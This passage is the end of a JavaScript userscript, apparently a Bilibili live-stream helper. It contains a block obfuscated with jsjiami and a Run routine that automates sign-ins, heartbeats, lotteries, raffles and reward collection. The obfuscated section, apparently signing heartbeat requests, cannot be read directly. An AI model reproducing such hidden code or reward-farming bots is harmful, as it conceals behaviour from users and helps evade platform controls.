_0x3d9f26[_0x1177('3e7','\x34\x56\x33\x36')](_0x4d1de3,_0x5e79ab);},'\x76\x54\x6d\x58\x58':function(_0x40c57e,_0x356f85){return _0x3d9f26['\x4c\x6b\x73\x6a\x79'](_0x40c57e,_0x356f85);},'\x50\x75\x54\x47\x63':_0x3d9f26[_0x1177('3e8','\x34\x32\x4e\x63')],'\x4a\x43\x79\x6a\x50':function(_0x4f733a,_0x5f804e){return _0x3d9f26[_0x1177('3e9','\x26\x76\x69\x68')](_0x4f733a,_0x5f804e);},'\x58\x62\x44\x65\x62':_0x3d9f26[_0x1177('3ea','\x25\x48\x23\x70')],'\x6a\x62\x54\x77\x7a':_0x3d9f26[_0x1177('3eb','\x51\x30\x49\x6c')]};Object[_0x1177('3ec','\x4a\x51\x42\x79')](_0x53d5f2,_0x3d9f26['\x79\x59\x66\x43\x6a'],{'\x76\x61\x6c\x75\x65':_0x44b68b});Object[_0x1177('3ed','\x61\x6c\x75\x31')](_0x53d5f2,_0x3d9f26[_0x1177('3ee','\x46\x33\x42\x34')],{'\x76\x61\x6c\x75\x65':_0x53d5f2[_0x1177('3ef','\x61\x6c\x75\x31')][_0x1177('3f0','\x75\x70\x24\x40')][_0x1177('3f1','\x4b\x64\x4b\x75')]});Object[_0x1177('3f2','\x46\x55\x45\x4b')](_0x53d5f2,_0x3d9f26[_0x1177('3f3','\x59\x73\x34\x54')],{'\x76\x61\x6c\x75\x65':_0x53d5f2[_0x1177('3f4','\x25\x50\x38\x57')][_0x1177('3f5','\x5d\x2a\x57\x78')][_0x1177('3f6','\x6d\x47\x6f\x39')]});Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x53d5f2,_0x3d9f26[_0x1177('3f7','\x4e\x46\x4e\x4c')],{'\x76\x61\x6c\x75\x65':_0x53d5f2['\x69\x6e\x73\x74\x61\x6e\x63\x65'][_0x1177('3f8','\x62\x7a\x75\x73')][_0x1177('3f9','\x34\x56\x33\x36')]});_0x53d5f2[_0x1177('3fa','\x6d\x47\x6f\x39')][_0x1177('3fb','\x59\x2a\x56\x51')]=function(_0x4f41c1,_0x1885c5){try{if(_0x51aa51[_0x1177('3fc','\x71\x40\x40\x78')](_0x51aa51[_0x1177('3fd','\x71\x40\x40\x78')],_0x51aa51['\x58\x62\x44\x65\x62'])){var _0x31ed03=_0x53d5f2[_0x1177('3cf','\x55\x41\x42\x65')][_0x1177('3fe','\x47\x66\x33\x5a')](_0x4f41c1);return _0x51aa51[_0x1177('3ff','\x4b\x64\x4b\x75')](_0x31ed03,DOMException)&&_0x51aa51[_0x1177('400','\x65\x31\x33\x53')](_0x51aa51['\x50\x75\x54\x47\x63'],_0x31ed03[_0x1177('401','\x4f\x52\x31\x39')]);}else{var _0x15e93e=_0x53d5f2[_0x1177('2e2','\x65\x6f\x44\x5e')][_0x1177('402','\x21\x39\x34\x34')](_0x53d5f2[_0x1177('403','\x56\x68\x39\x45')]['\x65\x78\x70\x6f\x72\x74\x73']['\x73\x70\x79\x64\x65\x72'](_0x53d5f2[_0x1177('404','\x4e\x46\x4e\x4c')][_0x1177('405','\x34\x32\x4e\x63')](_0x4f41c1),_0x53d5f2[_0x1177('14b','\x56\x68\x39\x45')][_0x1177('406','\x26\x76\x69\x68')](_0x1885c5)));return _0x15e93e;}}catch(_0xa7b616){console['\x6c\x6f\x67'](_0x51aa51[_0x1177('407','\x76\x21\x42\x4f')],_0xa7b616);}};_0x3d9f26['\x42\x43\x4a\x51\x43'](_0x5cd323);return _0x53d5f2[_0x1177('408','\x55\x41\x42\x65')];}};}};;_0xodR='jsjiami.com.v6';

	const Run = async () => {
	    await TokenLoad();
	    // 每天一次
	    Statistics.run();
	    if (CONFIG.AUTO_SIGN) Sign.run();
	    if (CONFIG.SILVER2COIN) Exchange.run();
	    if (CONFIG.AUTO_GROUP_SIGN) GroupSign.run();
	    if (CONFIG.AUTO_DAILYREWARD) DailyReward.run();
	    if (CONFIG.MOBILE_HEARTBEAT) {
		MobileHeartbeat.run();
		WebHeartbeat.run();
	    }
	    //if (CONFIG.AUTO_GROUP_SIGN || CONFIG.AUTO_DAILYREWARD) createIframe('//api.live.bilibili.com', 'GROUPSIGN|DAILYREWARD');
	    // 每过一定时间一次
	    if (CONFIG.AUTO_TASK) Task.run();
	    if (CONFIG.AUTO_GIFT) Gift.run();
	    // 持续运行
	    if (CONFIG.AUTO_TREASUREBOX) TreasureBox.run();
	    if (CONFIG.AUTO_LOTTERY) Lottery.run();
	    RafflePorcess.run();
	    TopRankTask.run();
	    HeartGift.run();
	    BiliPush.run();
	};

	$(document).ready(() => {
	    Init().then(Run);
	});
    }
})();